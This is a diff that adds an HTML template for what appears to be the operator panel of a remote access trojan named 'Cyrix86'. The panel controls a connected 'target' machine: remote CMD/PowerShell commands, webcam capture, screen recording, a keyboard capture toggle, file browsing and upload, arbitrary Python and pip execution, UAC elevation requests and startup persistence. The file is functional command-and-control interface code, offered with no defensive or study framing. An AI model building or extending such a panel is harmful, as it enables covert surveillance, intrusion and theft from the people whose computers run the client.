@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyrix86 | Panel</title>
+    <link rel="stylesheet" href="/public/css/global.css">
+    <link rel="stylesheet" href="/public/css/panel.css">
+</head>
+
+<body>
+
+    <aside class="menu p-2 has-background-black" style="overflow-y: auto;">
+        <a href="/">
+            <h1 class="title is-5 m-1">CYRI<span class="has-text-danger">x</span>86</h1>
+        </a>
+
+        <div class="is-flex is-gap-1 is-align-items-center is-justify-content-space-between my-3">
+            <p class="menu-label m-0">Controls</p>
+            <button class="button is-small is-dark menu-button">
+                <div class="icon">
+                    <span class="mdi mdi-menu-open"></span>
+                </div>
+            </button>
+        </div>
+
+        <ul class="menu-list">
+            <button data-component="terminal">
+                <img src="/public/src/icons/terminal.png" alt="terminal">
+                <span>Terminal</span>
+            </button>
+            <button data-component="webcam">
+                <img src="/public/src/icons/webcam.png" alt="webcam">
+                <span>Webcam</span>
+            </button>
+            <button data-component="display">
+                <img src="/public/src/icons/display.png" alt="display">
+                <span>Display</span>
+            </button>
+            <button data-component="sound">
+                <img src="/public/src/icons/sound.png" alt="sound">
+                <span>Sound</span>
+            </button>
+            <button data-component="notifications">
+                <img src="/public/src/icons/notifications.png" alt="notifications">
+                <span>Notifications</span>
+            </button>
+            <button data-component="keyboard">
+                <img src="/public/src/icons/keyboard.png" alt="keyboard">
+                <span>Keyboard</span>
+            </button>
+            <button data-component="filemanager">
+                <img src="/public/src/icons/filemanager.png" alt="filemanager">
+                <span>Filemanager</span>
+            </button>
+            <button data-component="python">
+                <img src="/public/src/icons/python.png" alt="python">
+                <span>Python</span>
+            </button>
+            <button data-component="others">
+                <img src="/public/src/icons/others.png" alt="others">
+                <span>UAC & Others</span>
+            </button>
+
+            <p class="menu-label">Last Response</p>
+            <div class="field">
+                <p class="label is-small has-text-weight-light">Online</p>
+                <code id="lastOnline-text" class="has-text-primary">{{ info.lastOnline }}</code>
+            </div>
+            <div class="field">
+                <p class="label is-small has-text-weight-light">Offline</p>
+                <code id="lastOffline-text">{{ info.lastOffline || "-" }}</code>
+            </div>
+        </ul>
+    </aside>
+
+    <main>
+        <header
+            class="has-background-black p-2 is-flex is-align-items-center is-justify-content-space-between is-gap-1">
+            <p class="is-size-6">{{ info.id }}</p>
+
+            <div class="is-flex is-gap-1 is-align-items-center">
+                <span class="mdi mdi-signal {{ info.isOnline ? " has-text-primary" : "has-text-danger" }}"
+                    id="client-status"></span>
+
+                <small>|</small>
+                <a href="/storage?id={{ info.id }}" class="button is-dark is-small">
+                    <div class="icon px-3">
+                        <span class="mdi mdi-folder"></span>
+                    </div>
+                    <span>Storage</span>
+                </a>
+                <a href="/" class="button is-dark is-small">
+                    <div class="icon px-3">
+                        <span class="mdi mdi-home"></span>
+                    </div>
+                </a>
+
+                <button class="button is-small is-dark menu-button">
+                    <div class="icon">
+                        <span class="mdi mdi-menu"></span>
+                    </div>
+                </button>
+            </div>
+        </header>
+
+        <!-- shell -->
+        <div class="component-output terminal-output"></div>
+        <form class="component-form terminal-form">
+            <input type="hidden" name="type" value="terminal">
+            <div class="is-flex is-gap-1 is-align-items-center">
+                <div class="select is-small">
+                    <select name="app">
+                        <option value="cmd">CMD</option>
+                        <option value="powershell">Powershell</option>
+                    </select>
+                </div>
+                <p style="word-break: break-all;" class="cwd-text">
+                    {{ info.cwd }}
+                </p>
+            </div>
+
+            <div class="is-flex is-gap-1 is-align-items-center my-2">
+                <small>$ </small>
+                <input type="text" name="value" required autocomplete="off" spellcheck="false"
+                    placeholder="Type command here..." clear>
+            </div>
+        </form>
+
+        <!-- webcam -->
+        <form class="component-form webcam-form">
+            <input type="hidden" name="type" value="webcam">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">Device Index</label>
+                    <input class="input is-small" type="number" name="deviceIndex" value="0" min="0" autocomplete="off"
+                        spellcheck="false">
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-camera"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+        </form>
+
+        <div class="component-output webcam-output"></div>
+
+        <!-- display -->
+        <form class="component-form display-form">
+            <input type="hidden" name="type" value="display">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">Action</label>
+                    <div class="select is-small">
+                        <select name="action">
+                            <option value="snapshot">Snapshot</option>
+                            <option value="record">Record</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Device Index</label>
+                    <input class="input is-small" type="number" name="deviceIndex" value="0" min="0" autocomplete="off"
+                        spellcheck="false" required>
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Record Duration (In Seconds)</label>
+                    <input class="input is-small" type="number" name="duration" value="10" min="1" autocomplete="off"
+                        spellcheck="false">
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-monitor"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+        </form>
+
+        <div class="component-output display-output"></div>
+
+        <!-- sound -->
+        <form class="component-form sound-form">
+            <input type="hidden" name="type" value="sound">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field" style="width: 100%;max-width: 900px;">
+                    <label class="label is-small">File Path</label>
+                    <input class="input is-small" type="text" name="filePath" value="C:\Windows\Media\Alarm01.wav"
+                        autocomplete="off" spellcheck="false">
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-volume-high"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+            <p class="help">
+                <strong>Note:</strong> <code>.wav</code> file format is only supported.
+            </p>
+        </form>
+
+        <div class="component-output sound-output"></div>
+
+        <!-- notifications -->
+        <form class="component-form notifications-form">
+            <input type="hidden" name="type" value="notifications">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">Action</label>
+                    <div class="select is-small">
+                        <select name="action">
+                            <option value="messagebox">Message Box</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Title</label>
+                    <input class="input is-small" type="text" name="title" value="Hello" autocomplete="off"
+                        spellcheck="false">
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Message</label>
+                    <input class="input is-small" type="text" name="message" value="Hello" autocomplete="off"
+                        spellcheck="false">
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Icon</label>
+                    <div class="select is-small">
+                        <select name="icon">
+                            <option value="0">None</option>
+                            <option value="64" selected>Information</option>
+                            <option value="48">Exclamation</option>
+                            <option value="32">Question</option>
+                            <option value="16">Critical</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Buttons</label>
+                    <div class="select is-small">
+                        <select name="buttons">
+                            <option value="0">ok only</option>
+                            <option value="1" selected>ok | cancel</option>
+                            <option value="2">abort | retry | ignore</option>
+                            <option value="3">yes | no | cancel</option>
+                            <option value="4">yes | no</option>
+                            <option value="5">retry | cancel</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-bell"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+        </form>
+
+        <div class="component-output notifications-output"></div>
+
+        <!-- keyboard -->
+        <form class="component-form keyboard-form">
+            <input type="hidden" name="type" value="keyboard">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">Action</label>
+                    <div class="select is-small">
+                        <select name="action">
+                            <option value="start">start</option>
+                            <option value="stop">stop</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-keyboard"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+        </form>
+
+        <div class="component-output keyboard-output"></div>
+
+        <!-- filemanager -->
+        <form class="component-form filemanager-form">
+            <input type="hidden" name="type" value="filemanager">
+            <input type="hidden" name="action" value="goto">
+
+            <div class="my-2 is-flex is-align-items-center is-gap-1">
+                <span class="icon">
+                    <span class="mdi mdi-folder-open"></span>
+                </span>
+                <input class="input is-small is-flex-grow-1 cwd-text" type="text" value="{{ info.cwd }}" name="value">
+                <button class="button is-small is-dark" type="submit">
+                    <div class="icon">
+                        <span class="mdi mdi-arrow-right"></span>
+                    </div>
+                </button>
+                <button class="button is-small is-dark" type="button" id="filemanager-upload">
+                    Upload
+                </button>
+            </div>
+        </form>
+
+        <div class="component-output filemanager-output">
+            <div class="table-container">
+                <table id="files-table" class="table is-striped is-fullwidth"></table>
+            </div>
+            <hr class="my-2">
+        </div>
+
+        <!-- python -->
+        <form class="component-form python-form">
+            <input type="hidden" name="type" value="python">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">App</label>
+                    <div class="select is-small">
+                        <select name="app">
+                            <option value="python">Python</option>
+                            <option value="pip">Pip</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label class="label is-small">Args</label>
+                    <input class="input is-small" type="text" name="args" autocomplete="off" spellcheck="false"
+                        placeholder="install package_name">
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-language-python"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+            <p class="help">
+                <strong>Note:</strong> If you want to install pip package just write <code>install package_name</code>
+                in args input.
+            </p>
+
+            <div class="editor">
+                <textarea name="code" class="textarea" placeholder="Code" autocomplete="off"
+                    spellcheck="false"></textarea>
+                <pre class="component-output python-output"></pre>
+            </div>
+        </form>
+
+        <!-- others -->
+        <form class="component-form others-form">
+            <input type="hidden" name="type" value="others">
+
+            <div class="is-flex is-gap-1 is-align-items-center is-flex-wrap-wrap">
+                <div class="field">
+                    <label class="label is-small">Action</label>
+                    <div class="select is-small">
+                        <select name="action">
+                            <option value="uac">Request UAC</option>
+                            <option value="startup">Set Startup</option>
+                            <option value="exit">Exit client</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button class="button is-primary is-small">
+                    <div class="icon">
+                        <span class="mdi mdi-cog"></span>
+                    </div>
+                    <span>Run</span>
+                </button>
+            </div>
+
+            <p class="help">
+                <strong>Note:</strong>
+                When UAC request is accepted, the client will be restarted.
+                And connect with new ID. <code>target-Id</code> => <code>target-Id-UAC</code>
+            </p>
+        </form>
+
+        <div class="component-output others-output"></div>
+    </main>
+
+    <script>
+        window.__TARK_DATA__ = {
+            id: `{{ info.id }}`
+        }
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.8.1/socket.io.js"></script>
+    <script src="/public/js/panel.bsr.js"></script>
+</body>
+
+</html>
